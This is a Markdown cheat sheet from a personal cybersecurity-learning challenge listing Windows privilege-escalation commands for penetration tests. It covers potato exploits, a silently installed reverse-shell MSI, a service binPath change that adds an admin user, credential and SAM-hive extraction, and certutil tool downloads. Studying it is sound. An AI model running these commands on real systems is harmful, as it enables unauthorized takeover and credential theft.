# Windows Privilege Escalation - Reference Card

> Part of the [100 Days of Cybersecurity](../README.md) challenge - Day 036

Quick reference for Windows privilege escalation techniques during a penetration test.

---

## 🔍 Initial Checks (Run These First)

```cmd
whoami                                    :: current user
whoami /priv                              :: privileges - look for SeImpersonatePrivilege
whoami /groups                            :: group memberships
net localgroup administrators             :: who else is admin?
systeminfo | findstr /B /C:"OS" /C:"Hotfix"   :: OS + patches
netstat -ano                              :: open ports
```

---

## ⚡ Quick Win Checks

### 1. SeImpersonatePrivilege

```cmd
whoami /priv | findstr "SeImpersonate"
:: If enabled → use PrintSpoofer or JuicyPotato

PrintSpoofer.exe -i -c cmd              :: Windows 10/Server 2019+
JuicyPotato.exe -l 1337 -p cmd.exe -t * :: Windows < Server 2019
```

### 2. AlwaysInstallElevated

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
:: Both = 0x1 → vulnerable

msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

### 3. Stored Credentials

```cmd
cmdkey /list                              :: saved credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
type C:\Windows\Panther\Unattend.xml     :: setup leftovers
type C:\Windows\Panther\Unattended.xml
netsh wlan show profile name="SSID" key=clear  :: WiFi passwords
```

### 4. Unquoted Service Paths

```cmd
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /v """
:: Find spaces in paths without quotes
:: Plant binary in writable directory before the service binary
```

### 5. Weak Service Permissions

```cmd
accesschk.exe -uwcqv "Users" *           :: services Users group can modify
accesschk.exe -uwcqv "Everyone" *
:: If modifiable:
sc config SERVICE binPath= "cmd /c net user hacker Password123! /add"
sc stop SERVICE && sc start SERVICE
```

---

## 📁 Credential Hunting

```cmd
:: Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

:: Common config files
dir /s /b *pass* *cred* *vnc* *.config* 2>nul
findstr /si password *.xml *.ini *.txt *.config

:: Browser saved passwords
dir "%APPDATA%\Mozilla\Firefox\Profiles"
dir "%LOCALAPPDATA%\Google\Chrome\User Data\Default"

:: PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## 🕐 Scheduled Tasks

```cmd
schtasks /query /fo LIST /v | findstr /i "task\|run\|status"
:: Look for tasks running as SYSTEM with writable scripts

:: Check if script is writable
icacls "C:\scripts\backup.bat"
```

---

## 🔑 SAM Database Extraction

```cmd
:: Requires SYSTEM or local admin
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
reg save HKLM\SECURITY C:\Temp\security.hive

:: Transfer to Kali and extract hashes
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---

## 🤖 Automated Tools

```cmd
:: WinPEAS - comprehensive enumeration
.\winpeas.exe

:: PowerUp - PowerShell privesc checks
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks

:: Seatbelt - .NET security checks
.\Seatbelt.exe all
```

---

## 🛠️ Common Tool Downloads

```powershell
:: WinPEAS
certutil -urlcache -split -f "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe" winpeas.exe

:: PrintSpoofer
certutil -urlcache -split -f "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" PrintSpoofer.exe

:: accesschk (Sysinternals)
certutil -urlcache -split -f "https://live.sysinternals.com/accesschk.exe" accesschk.exe
```

---

## 📊 Privilege Check Priority

```
Priority 1 (Immediate win):
  ✓ SeImpersonatePrivilege → PrintSpoofer/JuicyPotato → SYSTEM

Priority 2 (Common findings):
  ✓ AlwaysInstallElevated → MSI → SYSTEM
  ✓ Unattend.xml with admin password → direct login
  ✓ Autologon credentials in registry

Priority 3 (Requires service restart):
  ✓ Unquoted service paths → binary planting
  ✓ Weak service permissions → binPath change

Priority 4 (Slower path):
  ✓ Scheduled task with writable script
  ✓ Kernel exploit (last resort - noisy)
```

---

## 🔗 References

- [LOLBAS - Living Off The Land Binaries](https://lolbas-project.github.io/)
- [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [PayloadsAllTheThings Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

---

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*